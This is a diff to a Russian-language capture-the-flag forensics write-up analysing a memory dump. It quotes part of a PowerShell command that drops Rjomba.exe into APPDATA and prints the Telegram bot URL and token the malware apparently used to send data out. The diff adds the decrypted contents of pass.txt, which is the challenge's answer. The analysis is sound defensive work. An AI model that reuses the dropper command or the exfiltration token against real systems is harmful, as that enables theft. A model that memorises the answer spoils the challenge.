@@ -50,3 +50,8 @@ powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);
 Поискав в дампе памяти системы можно было найти url - `https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE`  - значит, что злоумешленник отправлял данные боту в `telegram`, а аутентифицировался с помощью ключа `7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE`
 ### 8. Каково содержимое расшифрованного файла pass.txt на рабочем столе?
 Так как `AES` использовался в режиме `CBC`, то чтобы расшифровать его, нам нужно было получить секретный initial vector. Поискав в дампе памяти и попробовав оттуда разные строки, было обнаружено что строка `abababababababab` выдавала пароль, который принимали жюри.
+
+Расшифрованное содержимое `pass.txt`:
+```
+sFYZ#2z9VdUR9sm`3JRz
+```
